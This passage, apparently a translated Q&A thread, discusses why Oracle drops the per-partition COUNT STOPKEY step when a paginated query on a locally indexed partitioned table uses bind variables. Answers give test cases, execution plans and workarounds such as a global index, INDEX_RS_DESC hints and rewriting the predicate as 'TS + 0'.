    6 - access(SYS_OP_DESCEND("CREATE_TS")>=HEXTORAW('878EFCF9F6C5FEFAFF')  AND
    SYS_OP_DESCEND("TRX_ID")>=HEXTORAW('36F7E7D7F8A4F0BFA9A3FF')  AND
    SYS_OP_DESCEND("CREATE_TS")<=HEXTORAW('878EFDFEF8FEF8FF')  AND
    SYS_OP_DESCEND("TRX_ID")<=HEXTORAW('36FBD0E9D4E9DBD5F8A6FF') )
    filter(SYS_OP_UNDESCEND(SYS_OP_DESCEND("CREATE_TS"))<=TIMESTAMP' 2013-03-06 08:57:00,000000000' AND
    SYS_OP_UNDESCEND(SYS_OP_DESCEND("TRX_ID"))<=72339069014638591 AND
    SYS_OP_UNDESCEND(SYS_OP_DESCEND("TRX_ID"))>=34621422135410688 AND
    SYS_OP_UNDESCEND(SYS_OP_DESCEND("CREATE_TS"))>=TIMESTAMP' 2013-02-01 00:00:00,000000000') 
```

它完美地工作。

顺便说一下，表`OUT_SMS`是按字段**分区**的，并且是每个分区上的**本地索引**。`TRX_ID``OUT_SMS_CREATE_TS_TRX_ID_IX` **`(CREATE_TS DESC, TRX_ID DESC)`**

 **但是，如果我将此查询转换为**准备好的语句**：

```
select rd from (
    select /*+ INDEX(OUT_SMS OUT_SMS_CREATE_TS_TRX_ID_IX) */ rowid rd
    from OUT_SMS     
    where  TRX_ID between ? and ?       
       and CREATE_TS between ? and ?
    order by CREATE_TS DESC, TRX_ID DESC
) where rownum <= 20 
```

Oracle 生成下一个计划：

```
 ----------------------------------------------------------------------------------------------------------------------------
    | Id  | Operation                    | Name                        | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |
    ----------------------------------------------------------------------------------------------------------------------------
    |   0 | SELECT STATEMENT             |                             |    20 |   240 | 14743   (1)| 00:00:01 |       |       |
    |*  1 |  COUNT STOPKEY               |                             |       |       |            |          |       |       |
    |   2 |   VIEW                       |                             |  1964 | 23568 | 14743   (1)| 00:00:01 |       |       |
    |*  3 |    SORT ORDER BY STOPKEY     |                             |  1964 | 66776 | 14743   (1)| 00:00:01 |       |       |
    |*  4 |     FILTER                   |                             |       |       |            |          |       |       |
    |   5 |      PARTITION RANGE ITERATOR|                             |  1964 | 66776 | 14742   (1)| 00:00:01 |   KEY |   KEY |
    |*  6 |       INDEX RANGE SCAN       | OUT_SMS_CREATE_TS_TRX_ID_IX |  1964 | 66776 | 14742   (1)| 00:00:01 |   KEY |   KEY |
    ----------------------------------------------------------------------------------------------------------------------------

    Predicate Information (identified by operation id):
    ---------------------------------------------------

    1 - filter(ROWNUM<=20)
    3 - filter(ROWNUM<=20)
    4 - filter(TO_TIMESTAMP(:RR,'yyyy-mm-dd hh24:mi:ss')<=TO_TIMESTAMP(:T,'yyyy-mm-dd hh24:mi:ss') AND
    TO_NUMBER(:ABC)<=TO_NUMBER(:EBC))
    6 - access(SYS_OP_DESCEND("CREATE_TS")>=SYS_OP_DESCEND(TO_TIMESTAMP(:T,'yyyy-mm-dd hh24:mi:ss')) AND
    SYS_OP_DESCEND("TRX_ID")>=SYS_OP_DESCEND(TO_NUMBER(:EBC)) AND
    SYS_OP_DESCEND("CREATE_TS")<=SYS_OP_DESCEND(TO_TIMESTAMP(:RR,'yyyy-mm-dd hh24:mi:ss')) AND
    SYS_OP_DESCEND("TRX_ID")<=SYS_OP_DESCEND(TO_NUMBER(:ABC)))
    filter(SYS_OP_UNDESCEND(SYS_OP_DESCEND("TRX_ID"))>=TO_NUMBER(:ABC) AND
    SYS_OP_UNDESCEND(SYS_OP_DESCEND("TRX_ID"))<=TO_NUMBER(:EBC) AND
    SYS_OP_UNDESCEND(SYS_OP_DESCEND("CREATE_TS"))>=TO_TIMESTAMP(:RR,'yyyy-mm-dd hh24:mi:ss') AND
    SYS_OP_UNDESCEND(SYS_OP_DESCEND("CREATE_TS"))<=TO_TIMESTAMP(:T,'yyyy-mm-dd hh24:mi:ss')) 
```

操作**COUNT STOPKEY**从计划中消失。此操作应在分析索引以从每个分区中获取 20 行（如第一个查询）之后进行。

如何编写准备好的语句以在计划中包含 COUNT STOPKEY？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-18T17:48:41.377

当您使用绑定变量时，Oracle 被迫使用[动态分区修剪](http://docs.oracle.com/cd/E11882_01/server.112/e25523/part_avail.htm#BABFGAEC)而不是[静态分区修剪](http://docs.oracle.com/cd/E11882_01/server.112/e25523/part_avail.htm#BABEGHBB)。这样做的结果是 Oracle 在解析时不知道将访问哪些分区，因为这会根据您的输入变量而变化。

这意味着当使用文字值（而不是绑定变量）时，我们知道您的本地索引将访问哪些分区。因此，`count stopkey`可以在我们修剪分区之前将其应用于索引的输出。

使用绑定变量时，`partition range iterator`必须弄清楚您正在访问哪些分区。然后它会检查以确保操作之间的第一个变量实际上确实比第二个变量（`filter`第二个计划中的操作）具有更低的值。

这可以很容易地重现，如以下测试用例所示：

```
create table tab (
  x date,
  y integer,
  filler varchar2(100)
) partition by range(x) (
  partition p1 values less than (date'2013-01-01'),
  partition p2 values less than (date'2013-02-01'),
  partition p3 values less than (date'2013-03-01'),
  partition p4 values less than (date'2013-04-01'),
  partition p5 values less than (date'2013-05-01'),
  partition p6 values less than (date'2013-06-01')
);

insert into tab (x, y)
  select add_months(trunc(sysdate, 'y'), mod(rownum, 5)), rownum, dbms_random.string('x', 50)
  from   dual 
  connect by level <= 1000;

create index i on tab(x desc, y desc) local;

exec dbms_stats.gather_table_stats(user, 'tab', cascade => true);

explain plan for 
SELECT * FROM (
  SELECT rowid FROM tab
  where  x between date'2013-01-01' and date'2013-02-02'
  and    y between 50 and 100
  order  by x desc, y desc
)
where rownum <= 5;

SELECT * FROM table(dbms_xplan.display(null, null, 'BASIC +ROWS +PARTITION'));

--------------------------------------------------------------------                                                                                                                                                                                                                                         
| Id  | Operation                   | Name | Rows  | Pstart| Pstop |                                                                                                                                                                                                                                         
--------------------------------------------------------------------                                                                                                                                                                                                                                         
|   0 | SELECT STATEMENT            |      |     1 |       |       |                                                                                                                                                                                                                                         
|   1 |  COUNT STOPKEY              |      |       |       |       |                                                                                                                                                                                                                                         
|   2 |   VIEW                      |      |     1 |       |       |                                                                                                                                                                                                                                         
|   3 |    SORT ORDER BY STOPKEY    |      |     1 |       |       |                                                                                                                                                                                                                                         
|   4 |     PARTITION RANGE ITERATOR|      |     1 |     2 |     3 |                                                                                                                                                                                                                                         
|   5 |      COUNT STOPKEY          |      |       |       |       |                                                                                                                                                                                                                                         
|   6 |       INDEX RANGE SCAN      | I    |     1 |     2 |     3 |                                                                                                                                                                                                                                         
-------------------------------------------------------------------- 

explain plan for 
SELECT * FROM (
  SELECT rowid FROM tab
  where  x between to_date(:st, 'dd/mm/yyyy') and to_date(:en, 'dd/mm/yyyy')
  and    y between :a and :b
  order  by x desc, y desc
)
where rownum <= 5;

SELECT * FROM table(dbms_xplan.display(null, null, 'BASIC +ROWS +PARTITION'));

---------------------------------------------------------------------                                                                                                                                                                                                                                        
| Id  | Operation                    | Name | Rows  | Pstart| Pstop |                                                                                                                                                                                                                                        
---------------------------------------------------------------------                                                                                                                                                                                                                                        
|   0 | SELECT STATEMENT             |      |     1 |       |       |                                                                                                                                                                                                                                        
|   1 |  COUNT STOPKEY               |      |       |       |       |                                                                                                                                                                                                                                        
|   2 |   VIEW                       |      |     1 |       |       |                                                                                                                                                                                                                                        
|   3 |    SORT ORDER BY STOPKEY     |      |     1 |       |       |                                                                                                                                                                                                                                        
|   4 |     FILTER                   |      |       |       |       |                                                                                                                                                                                                                                        
|   5 |      PARTITION RANGE ITERATOR|      |     1 |   KEY |   KEY |                                                                                                                                                                                                                                        
|   6 |       INDEX RANGE SCAN       | I    |     1 |   KEY |   KEY |                                                                                                                                                                                                                                        
--------------------------------------------------------------------- 
```

与您的示例一样，第二个查询只能`key`在解析时将分区过滤为 a，而不是第一个示例中的确切分区。

这是文字值可以提供比绑定变量更好的性能的少数情况之一。您应该调查这是否适合您。

最后，您说您希望每个分区有 20 行。您的查询不会执行此操作，它只会根据您的顺序返回前 20 行。对于 20 行/分区，您需要执行以下操作：

```
select rd from (
    select rowid rd, 
           row_number() over (partition by trx_id order by create_ts desc) rn
    from OUT_SMS     
    where  TRX_ID between ? and ?       
       and CREATE_TS between ? and ?
    order by CREATE_TS DESC, TRX_ID DESC
) where rn <= 20 
```

**更新**

您没有得到的原因与“坏”计划的第 4 行中`count stopkey`的操作有关。`filter`如果你重复上面的例子，你可以更清楚地看到这一点，但没有分区。

这为您提供了以下计划：

```
----------------------------------------                                                                                                                                                                                                                                                                     
| Id  | Operation               | Name |                                                                                                                                                                                                                                                                     
----------------------------------------                                                                                                                                                                                                                                                                     
|   0 | SELECT STATEMENT        |      |                                                                                                                                                                                                                                                                     
|*  1 |  COUNT STOPKEY          |      |                                                                                                                                                                                                                                                                     
|   2 |   VIEW                  |      |                                                                                                                                                                                                                                                                     
|*  3 |    SORT ORDER BY STOPKEY|      |                                                                                                                                                                                                                                                                     
|*  4 |     TABLE ACCESS FULL   | TAB  |                                                                                                                                                                                                                                                                     
----------------------------------------                                                                                                                                                                                                                                                                     

Predicate Information (identified by operation id):                                                                                                                                                                                                                                                          
---------------------------------------------------                                                                                                                                                                                                                                                          

   1 - filter(ROWNUM<=5)                                                                                                                                                                                                                                                                                     
   3 - filter(ROWNUM<=5)                                                                                                                                                                                                                                                                                     
   4 - filter("X">=TO_DATE(' 2013-01-01 00:00:00', 'syyyy-mm-dd                                                                                                                                                                                                                                              
              hh24:mi:ss') AND "X"<=TO_DATE(' 2013-02-02 00:00:00', 'syyyy-mm-dd                                                                                                                                                                                                                             
              hh24:mi:ss') AND "Y">=50 AND "Y"<=100)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       

----------------------------------------                                                                                                                                                                                                                                                                     
| Id  | Operation               | Name |                                                                                                                                                                                                                                                                     
----------------------------------------                                                                                                                                                                                                                                                                     
|   0 | SELECT STATEMENT        |      |                                                                                                                                                                                                                                                                     
|*  1 |  COUNT STOPKEY          |      |                                                                                                                                                                                                                                                                     
|   2 |   VIEW                  |      |                                                                                                                                                                                                                                                                     
|*  3 |    SORT ORDER BY STOPKEY|      |                                                                                                                                                                                                                                                                     
|*  4 |     FILTER              |      |                                                                                                                                                                                                                                                                     
|*  5 |      TABLE ACCESS FULL  | TAB  |                                                                                                                                                                                                                                                                     
----------------------------------------                                                                                                                                                                                                                                                                     

Predicate Information (identified by operation id):                                                                                                                                                                                                                                                          
---------------------------------------------------                                                                                                                                                                                                                                                          

   1 - filter(ROWNUM<=5)                                                                                                                                                                                                                                                                                     
   3 - filter(ROWNUM<=5)                                                                                                                                                                                                                                                                                     
   4 - filter(TO_NUMBER(:A)<=TO_NUMBER(:B) AND                                                                                                                                                                                                                                                               
              TO_DATE(:ST,'dd/mm/yyyy')<=TO_DATE(:EN,'dd/mm/yyyy'))                                                                                                                                                                                                                                          
   5 - filter("Y">=TO_NUMBER(:A) AND "Y"<=TO_NUMBER(:B) AND                                                                                                                                                                                                                                                  
              "X">=TO_DATE(:ST,'dd/mm/yyyy') AND "X"<=TO_DATE(:EN,'dd/mm/yyyy')) 
```

如您所见，`filter`当您使用出现在`sort order by stopkey`. 这发生在访问索引之后。这是检查变量的值是否允许返回数据（您之间的第一个变量实际上比第二个变量的值低）。使用文字时这不是必需的，因为优化器已经知道 50 小于 100（在这种情况下）。但是，它不知道 :a 在解析时是否小于 :b 。

为什么这是我不知道的。这可能是 Oracle 有意设计的——如果为变量设置的值导致零行，则进行停止键检查是没有意义的——或者只是疏忽。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-19T10:27:17.093

我可以在 11.2.0.3 上重现您的发现。这是我的测试用例：

```
SQL> -- Table with 100 partitions of 100 rows 
SQL> CREATE TABLE out_sms
  2  PARTITION BY RANGE (trx_id)
  3     INTERVAL (100) (PARTITION p0 VALUES LESS THAN (0))
  4  AS
  5  SELECT ROWNUM trx_id,
  6         trunc(SYSDATE) + MOD(ROWNUM, 50) create_ts
  7  FROM dual CONNECT BY LEVEL <= 10000;

Table created

SQL> CREATE INDEX OUT_SMS_IDX ON out_sms (create_ts desc, trx_id desc) LOCAL;

Index created

[static plan]

SELECT rd
  FROM (SELECT /*+ INDEX(OUT_SMS OUT_SMS_IDX) */
         rowid rd
          FROM out_sms
         WHERE create_ts BETWEEN systimestamp AND systimestamp + 10
           AND trx_id BETWEEN 1 AND 500
         ORDER BY create_ts DESC, trx_id DESC)
 WHERE rownum <= 20;    
---------------------------------------------------------------------------
| Id  | Operation                   | Name        | Rows  | Pstart| Pstop |
---------------------------------------------------------------------------
|   0 | SELECT STATEMENT            |             |     1 |       |       |
|*  1 |  COUNT STOPKEY              |             |       |       |       |
|   2 |   VIEW                      |             |     1 |       |       |
|*  3 |    SORT ORDER BY STOPKEY    |             |     1 |       |       |
|   4 |     PARTITION RANGE ITERATOR|             |     1 |     2 |     7 |
|*  5 |      COUNT STOPKEY          |             |       |       |       |
|*  6 |       INDEX RANGE SCAN      | OUT_SMS_IDX |     1 |     2 |     7 |
---------------------------------------------------------------------------

[dynamic]     
----------------------------------------------------------------------------
| Id  | Operation                    | Name        | Rows  | Pstart| Pstop |
----------------------------------------------------------------------------
|   0 | SELECT STATEMENT             |             |     1 |       |       |
|*  1 |  COUNT STOPKEY               |             |       |       |       |
|   2 |   VIEW                       |             |     1 |       |       |
|*  3 |    SORT ORDER BY STOPKEY     |             |     1 |       |       |
|*  4 |     FILTER                   |             |       |       |       |
|   5 |      PARTITION RANGE ITERATOR|             |     1 |   KEY |   KEY |
|*  6 |       INDEX RANGE SCAN       | OUT_SMS_IDX |     1 |   KEY |   KEY |
---------------------------------------------------------------------------- 
```

在您的示例中，`ROWNUM`谓词在第一种情况下被推入**分区**索引范围扫描，而不是在第二种情况下。当使用静态变量时，计划显示 Oracle 每个分区仅获取 20 行，而使用动态变量，Oracle 将获取每个分区中满足子句的**所有行。**`WHERE`我找不到使用绑定变量时可以推送谓词的设置或统计配置。

我希望您可以使用具有更广泛静态限制的动态过滤器来玩弄系统，但似乎`ROWNUM`只要存在动态变量，谓词就不会在单个分区内使用：

```
SELECT rd
  FROM (SELECT /*+ INDEX(OUT_SMS OUT_SMS_IDX) */
         rowid rd
          FROM out_sms
         WHERE nvl(create_ts+:5, sysdate) BETWEEN :1 AND :2
           AND nvl(trx_id+:6, 0) BETWEEN :3 AND :4
           AND trx_id BETWEEN 1 AND 500
           AND create_ts BETWEEN systimestamp AND systimestamp + 10
         ORDER BY create_ts DESC, trx_id DESC)
 WHERE rownum <= 20

Plan hash value: 2740263591

----------------------------------------------------------------------------
| Id  | Operation                    | Name        | Rows  | Pstart| Pstop |
----------------------------------------------------------------------------
|   0 | SELECT STATEMENT             |             |     1 |       |       |
|*  1 |  COUNT STOPKEY               |             |       |       |       |
|   2 |   VIEW                       |             |     1 |       |       |
|*  3 |    SORT ORDER BY STOPKEY     |             |     1 |       |       |
|*  4 |     FILTER                   |             |       |       |       |
|   5 |      PARTITION RANGE ITERATOR|             |     1 |     2 |     7 |
|*  6 |       INDEX RANGE SCAN       | OUT_SMS_IDX |     1 |     2 |     7 |
---------------------------------------------------------------------------- 
```

如果此查询很重要并且其性能很关键，您可以将索引转换为全局索引。它将增加分区维护，但大多数分区操作可以在线使用最新的 Oracle 版本。在这种情况下，全局索引将与标准非分区表一样工作：

```
SQL> drop index out_sms_idx;

Index dropped

SQL> CREATE INDEX OUT_SMS_IDX ON out_sms (create_ts DESC, trx_id desc);

Index created

SELECT rd
  FROM (SELECT 
         rowid rd
          FROM out_sms
         WHERE create_ts BETWEEN :1 AND :2
           AND trx_id BETWEEN :3 AND :4
         ORDER BY create_ts DESC, trx_id DESC)
 WHERE rownum <= 20

------------------------------------------------------------------------
| Id  | Operation           | Name        | Rows  | Bytes | Cost (%CPU)|
------------------------------------------------------------------------
|   0 | SELECT STATEMENT    |             |     1 |    12 |     2   (0)|
|*  1 |  COUNT STOPKEY      |             |       |       |            |
|   2 |   VIEW              |             |     1 |    12 |     2   (0)|
|*  3 |    FILTER           |             |       |       |            |
|*  4 |     INDEX RANGE SCAN| OUT_SMS_IDX |     1 |    34 |     2   (0)|
------------------------------------------------------------------------ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-05-10T11:14:08.847

我可以确认该问题仍然是 Oracle 12.1.0.2.0 上的问题。

甚至硬编码的[分区消除](https://docs.oracle.com/database/121/VLDBG/GUID-E677C85E-C5E3-4927-B3DF-684007A7B05D.htm#VLDBG00401)界限也是不够的。

这是我的测试表：

```
CREATE TABLE FR_MESSAGE_PART (
    ID NUMBER(38) NOT NULL CONSTRAINT PK_FR_MESSAGE_PART PRIMARY KEY USING INDEX LOCAL,
    TRX_ID NUMBER(38) NOT NULL, TS TIMESTAMP NOT NULL, TEXT CLOB)
    PARTITION BY RANGE (ID) (PARTITION PART_0 VALUES LESS THAN (0));
CREATE INDEX IX_FR_MESSAGE_PART_TRX_ID ON FR_MESSAGE_PART(TRX_ID) LOCAL;
CREATE INDEX IX_FR_MESSAGE_PART_TS ON FR_MESSAGE_PART(TS) LOCAL; 
```

该表包含数百万条 OLTP 生产数据记录，这些记录持续了几个月。每个月都属于一个单独的分区。

此表的主键值始终包含较高位的时间部分，允许`ID`用于按日历期间进行范围分区。所有消息都继承更高的时间位`TRX_ID`。这确保了属于同一个业务操作的所有消息总是落在同一个分区中。

让我们从硬编码查询开始，用于选择给定时间段内应用分区消除边界的最新消息页面：

```
select * from (select * from FR_MESSAGE_PART
where TS >= DATE '2017-11-30' and TS < DATE '2017-12-02'
  and ID >= 376894993815568384 and ID < 411234940974268416
order by TS DESC) where ROWNUM <= 40; 
```

但是，在新收集的表统计信息之后，Oracle 优化器仍然错误地估计对两个整个月分区进行排序会比通过现有本地索引进行两天范围扫描要快：

```
-----------------------------------------------------------------------------------------------------------------------
| Id  | Operation                   | Name            | Rows  | Bytes |TempSpc| Cost (%CPU)| Time     | Pstart| Pstop |
-----------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT            |                 |    40 | 26200 |       |   103K  (1)| 00:00:05 |       |       |
|*  1 |  COUNT STOPKEY              |                 |       |       |       |            |          |       |       |
|   2 |   VIEW                      |                 |   803K|   501M|       |   103K  (1)| 00:00:05 |       |       |
|*  3 |    SORT ORDER BY STOPKEY    |                 |   803K|    70M|    92M|   103K  (1)| 00:00:05 |       |       |
|   4 |     PARTITION RANGE ITERATOR|                 |   803K|    70M|       | 86382   (1)| 00:00:04 |     2 |     3 |
|*  5 |      TABLE ACCESS FULL      | FR_MESSAGE_PART |   803K|    70M|       | 86382   (1)| 00:00:04 |     2 |     3 |
-----------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
   3 - filter(ROWNUM<=40)
   5 - filter("TS"<TIMESTAMP' 2017-12-01 00:00:00' AND "TS">=TIMESTAMP' 2017-11-29 00:00:00' AND 
              "ID">=376894993815568384) 
```

实际执行时间比计划中的估计要长一个数量级。

所以我们必须应用一个提示来强制使用索引：

```
select * from (select /*+ FIRST_ROWS(40) INDEX(FR_MESSAGE_PART (TS)) */ * from FR_MESSAGE_PART
where TS >= DATE '2017-11-30' and TS < DATE '2017-12-02'
  and ID >= 376894993815568384 and ID < 411234940974268416
order by TS DESC) where ROWNUM <= 40; 
```

现在该计划使用索引，但仍然涉及对两个整个分区的慢速排序：

```
-----------------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                     | Name                  | Rows  | Bytes |TempSpc| Cost (%CPU)| Time     | Pstart| Pstop |
-----------------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                              |                       |    40 | 26200 |       |   615K  (1)| 00:00:25 |       |       |
|*  1 |  COUNT STOPKEY                                |                       |       |       |       |            |          |       |       |
|   2 |   VIEW                                        |                       |   803K|   501M|       |   615K  (1)| 00:00:25 |       |       |
|*  3 |    SORT ORDER BY STOPKEY                      |                       |   803K|    70M|    92M|   615K  (1)| 00:00:25 |       |       |
|   4 |     PARTITION RANGE ITERATOR                  |                       |   803K|    70M|       |   598K  (1)| 00:00:24 |     2 |     3 |
|*  5 |      TABLE ACCESS BY LOCAL INDEX ROWID BATCHED| FR_MESSAGE_PART       |   803K|    70M|       |   598K  (1)| 00:00:24 |     2 |     3 |
|*  6 |       INDEX RANGE SCAN                        | IX_FR_MESSAGE_PART_TS |   576K|       |       |  2269   (1)| 00:00:01 |     2 |     3 |
-----------------------------------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
   3 - filter(ROWNUM<=40)
   5 - filter("ID">=376894993815568384)
   6 - access("TS">=TIMESTAMP' 2017-11-30 00:00:00' AND "TS"<TIMESTAMP' 2017-12-02 00:00:00') 
```

经过[Oracle 提示参考](https://docs.oracle.com/cd/B12037_01/server.101/b10752/hintsref.htm)和 google 的一番挣扎后，我们发现我们还必须使用[INDEX_DESC](https://docs.oracle.com/cd/B12037_01/server.101/b10752/hintsref.htm#5259)或[INDEX_RS_DESC](http://www.dba-oracle.com/t_hint_index_rs_asc.htm)提示明确指定索引范围扫描的下降方向：

```
select * from (select /*+ FIRST_ROWS(40) INDEX_RS_DESC(FR_MESSAGE_PART (TS)) */ * from FR_MESSAGE_PART
where TS >= DATE '2017-11-30' and TS < DATE '2017-12-02'
  and ID >= 376894993815568384 and ID < 411234940974268416
order by TS DESC) where ROWNUM <= 40; 
```

这最终给出了每个分区的快速计划，`COUNT STOPKEY`它按降序扫描分区，并且每个分区最多只对 40 行进行排序：

```
------------------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                      | Name                  | Rows  | Bytes |TempSpc| Cost (%CPU)| Time     | Pstart| Pstop |
------------------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                               |                       |    40 | 26200 |       |   615K  (1)| 00:00:25 |       |       |
|*  1 |  COUNT STOPKEY                                 |                       |       |       |       |            |          |       |       |
|   2 |   VIEW                                         |                       |   803K|   501M|       |   615K  (1)| 00:00:25 |       |       |
|*  3 |    SORT ORDER BY STOPKEY                       |                       |   803K|    70M|    92M|   615K  (1)| 00:00:25 |       |       |
|   4 |     PARTITION RANGE ITERATOR                   |                       |   803K|    70M|       |   598K  (1)| 00:00:24 |     3 |     2 |
|*  5 |      COUNT STOPKEY                             |                       |       |       |       |            |          |       |       |
|*  6 |       TABLE ACCESS BY LOCAL INDEX ROWID BATCHED| FR_MESSAGE_PART       |   803K|    70M|       |   598K  (1)| 00:00:24 |     3 |     2 |
|*  7 |        INDEX RANGE SCAN DESCENDING             | IX_FR_MESSAGE_PART_TS |   576K|       |       |  2269   (1)| 00:00:01 |     3 |     2 |
------------------------------------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
   3 - filter(ROWNUM<=40)
   5 - filter(ROWNUM<=40)
   6 - filter("ID">=376894993815568384)
   7 - access("TS">=TIMESTAMP' 2017-11-30 00:00:00' AND "TS"<TIMESTAMP' 2017-12-02 00:00:00')
       filter("TS">=TIMESTAMP' 2017-11-30 00:00:00' AND "TS"<TIMESTAMP' 2017-12-02 00:00:00') 
```

这运行得非常快，但估计的计划成本仍然过高。

到目前为止，一切都很好。现在让我们尝试将查询参数化以在我们的自定义 ORM 框架中使用：

```
select * from (select /*+ FIRST_ROWS(40) INDEX_RS_DESC(FR_MESSAGE_PART (TS)) */ * from FR_MESSAGE_PART
where TS >= :1 and TS < :2
  and ID >= :3 and ID < :4
order by TS DESC) where ROWNUM <= 40; 
```

但随后`COUNT STOPKEY`每个分区从问题中所述的计划中消失，并在另一个答案中确认：

```
----------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                      | Name                  | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |
----------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                               |                       |    40 | 26200 | 82349   (1)| 00:00:04 |       |       |
|*  1 |  COUNT STOPKEY                                 |                       |       |       |            |          |       |       |
|   2 |   VIEW                                         |                       |   153 |    97K| 82349   (1)| 00:00:04 |       |       |
|*  3 |    SORT ORDER BY STOPKEY                       |                       |   153 | 14076 | 82349   (1)| 00:00:04 |       |       |
|*  4 |     FILTER                                     |                       |       |       |            |          |       |       |
|   5 |      PARTITION RANGE ITERATOR                  |                       |   153 | 14076 | 82348   (1)| 00:00:04 |   KEY |   KEY |
|*  6 |       TABLE ACCESS BY LOCAL INDEX ROWID BATCHED| FR_MESSAGE_PART       |   153 | 14076 | 82348   (1)| 00:00:04 |   KEY |   KEY |
|*  7 |        INDEX RANGE SCAN DESCENDING             | IX_FR_MESSAGE_PART_TS |   110K|       |   450   (1)| 00:00:01 |   KEY |   KEY |
----------------------------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
   3 - filter(ROWNUM<=40)
   4 - filter(TO_NUMBER(:4)>TO_NUMBER(:3) AND TO_TIMESTAMP(:2)>TO_TIMESTAMP(:1))
   6 - filter("ID">=TO_NUMBER(:3) AND "ID"<TO_NUMBER(:4))
   7 - access("TS">=TO_TIMESTAMP(:1) AND "TS"<TO_TIMESTAMP(:2))
       filter("TS">=TO_TIMESTAMP(:1) AND "TS"<TO_TIMESTAMP(:2)) 
```

然后我尝试退回到硬编码的每月对齐的分区消除边界，但仍保留参数化的时间戳边界以最大程度地减少[计划缓存破坏](https://use-the-index-luke.com/blog/2011-07-16/planning-for-reuse)。

```
select * from (select /*+ FIRST_ROWS(40) INDEX_RS_DESC(FR_MESSAGE_PART (TS)) */ * from FR_MESSAGE_PART
where TS >= :1 and TS < :2
  and ID >= 376894993815568384 and ID < 411234940974268416
order by TS DESC) where ROWNUM <= 40; 
```

但仍然有缓慢的计划：

```
------------------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                      | Name                  | Rows  | Bytes |TempSpc| Cost (%CPU)| Time     | Pstart| Pstop |
------------------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                               |                       |    40 | 26200 |       | 83512   (1)| 00:00:04 |       |       |
|*  1 |  COUNT STOPKEY                                 |                       |       |       |       |            |          |       |       |
|   2 |   VIEW                                         |                       | 61238 |    38M|       | 83512   (1)| 00:00:04 |       |       |
|*  3 |    SORT ORDER BY STOPKEY                       |                       | 61238 |  5501K|  7216K| 83512   (1)| 00:00:04 |       |       |
|*  4 |     FILTER                                     |                       |       |       |       |            |          |       |       |
|   5 |      PARTITION RANGE ITERATOR                  |                       | 61238 |  5501K|       | 82214   (1)| 00:00:04 |     3 |     2 |
|*  6 |       TABLE ACCESS BY LOCAL INDEX ROWID BATCHED| FR_MESSAGE_PART       | 61238 |  5501K|       | 82214   (1)| 00:00:04 |     3 |     2 |
|*  7 |        INDEX RANGE SCAN DESCENDING             | IX_FR_MESSAGE_PART_TS | 79076 |       |       |   316   (1)| 00:00:01 |     3 |     2 |
------------------------------------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
   3 - filter(ROWNUM<=40)
   4 - filter(TO_TIMESTAMP(:2)>TO_TIMESTAMP(:1))
   6 - filter("ID">=376894993815568384)
   7 - access("TS">=TO_TIMESTAMP(:1) AND "TS"<TO_TIMESTAMP(:2))
       filter("TS">=TO_TIMESTAMP(:1) AND "TS"<TO_TIMESTAMP(:2)) 
```

@ChrisSaxon 在他的回答中提到，缺少嵌套`STOPKEY COUNT`与`filter(TO_TIMESTAMP(:2)>TO_TIMESTAMP(:1))`验证上限确实大于下限的操作有关。

考虑到这一点，我试图通过转换`TS between :a and :b`为等价物来欺骗 oprimizer `:b between TS and TS + (:b - :a)`。这行得通！

在对该更改的根本原因进行了一些额外调查后，我发现仅替换`TS >= :1 and TS < :2`为`TS + 0 >= :1 and TS < :2`有助于实现最佳执行计划。

```
select * from (select /*+ FIRST_ROWS(40) INDEX_RS_DESC(FR_MESSAGE_PART (TS)) */ * from FR_MESSAGE_PART
where TS + 0 >= :1 and TS < :2
  and ID >= 376894993815568384 and ID < 411234940974268416
order by TS DESC) where ROWNUM <= 40; 
```

该计划现在具有适当的`COUNT STOPKEY`每个分区，并且`INTERNAL_FUNCTION("TS")+0`我猜想防止有毒的额外边界检查过滤器的概念。

```
------------------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                      | Name                  | Rows  | Bytes |TempSpc| Cost (%CPU)| Time     | Pstart| Pstop |
------------------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                               |                       |    40 | 26200 |       | 10120   (1)| 00:00:01 |       |       |
|*  1 |  COUNT STOPKEY                                 |                       |       |       |       |            |          |       |       |
|   2 |   VIEW                                         |                       | 61238 |    38M|       | 10120   (1)| 00:00:01 |       |       |
|*  3 |    SORT ORDER BY STOPKEY                       |                       | 61238 |  5501K|  7216K| 10120   (1)| 00:00:01 |       |       |
|   4 |     PARTITION RANGE ITERATOR                   |                       | 61238 |  5501K|       |  8822   (1)| 00:00:01 |     3 |     2 |
|*  5 |      COUNT STOPKEY                             |                       |       |       |       |            |          |       |       |
|*  6 |       TABLE ACCESS BY LOCAL INDEX ROWID BATCHED| FR_MESSAGE_PART       | 61238 |  5501K|       |  8822   (1)| 00:00:01 |     3 |     2 |
|*  7 |        INDEX RANGE SCAN DESCENDING             | IX_FR_MESSAGE_PART_TS |  7908 |       |       |   631   (1)| 00:00:01 |     3 |     2 |
------------------------------------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
